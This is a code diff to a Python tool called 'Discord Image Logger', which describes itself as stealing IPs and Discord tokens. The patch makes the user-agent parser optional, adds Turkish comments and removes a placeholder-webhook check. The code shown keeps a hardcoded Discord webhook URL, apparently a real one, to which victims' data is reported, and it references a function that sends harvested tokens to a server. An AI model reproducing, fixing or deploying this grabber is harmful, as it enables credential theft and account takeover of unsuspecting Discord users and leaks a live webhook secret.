@@ -1,6 +1,15 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
-import traceback, requests, base64, httpagentparser, os, re, glob, platform
+import traceback, requests, base64, os, re, glob, platform
+
+# httpagentparser'ı güvenli bir şekilde içe aktar
+try:
+    import httpagentparser
+    HTTPAGENTPARSER_AVAILABLE = True
+except ImportError:
+    print("Warning: httpagentparser module not found. User-agent parsing will be disabled.")
+    print("Install it using: pip install httpagentparser")
+    HTTPAGENTPARSER_AVAILABLE = False
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
@@ -8,7 +17,7 @@ __version__ = "v2.4"
 __author__ = "DeKrypt"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1366849835172364439/4eTvT8QeTTAsIogI0ofV5tbjg_U8bSSoQ1no5WU5T_Mn0CpmbcAEAJ2tG4DrQ5TStY7P",  # Geçerli bir Discord webhook URL'si ile değiştirin
+    "webhook": "https://discord.com/api/webhooks/1366849835172364439/4eTvT8QeTTAsIogI0ofV5tbjg_U8bSSoQ1no5WU5T_Mn0CpmbcAEAJ2tG4DrQ5TStY7P",
     "image": "https://media.discordapp.net/attachments/1360581267862847549/1366847369080999966/Moon_phasesPHASE1.png?ex=68126f4f&is=68111dcf&hm=b4897b5f8bcda159d5ac4e17f163fb4ef6d72f5dbb8dbd9ea5ca29d8dfa8a66c&=&format=webp&quality=lossless",
     "imageArgument": True,
     "username": "Image Logger",
@@ -137,7 +146,11 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         if config["antiBot"] == 1:
             ping = ""
 
-    os_info, browser = httpagentparser.simple_detect(useragent or "Unknown")
+    # httpagentparser yoksa varsayılan değerler kullan
+    if HTTPAGENTPARSER_AVAILABLE:
+        os_info, browser = httpagentparser.simple_detect(useragent or "Unknown")
+    else:
+        os_info, browser = "Unknown", "Unknown"
     
     embed = {
         "username": config["username"],
@@ -332,8 +345,8 @@ height: 100vh;
                     message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                     message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                     message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[0])
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[1] if HTTPAGENTPARSER_AVAILABLE else "Unknown")
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[0] if HTTPAGENTPARSER_AVAILABLE else "Unknown")
 
                 datatype = 'text/html'
 
@@ -443,10 +456,6 @@ def send_local_tokens_to_server(tokens, server_url="http://localhost:8000"):
 
 if __name__ == "__main__":
     # Webhook URL'sini kontrol et
-    if config["webhook"] == "YOUR_NEW_WEBHOOK_URL_HERE":
-        print("Error: Please set a valid Discord webhook URL in config['webhook']")
-        exit(1)
-    
     if not validate_webhook(config["webhook"]):
         print("Error: Invalid Discord webhook URL")
         exit(1)
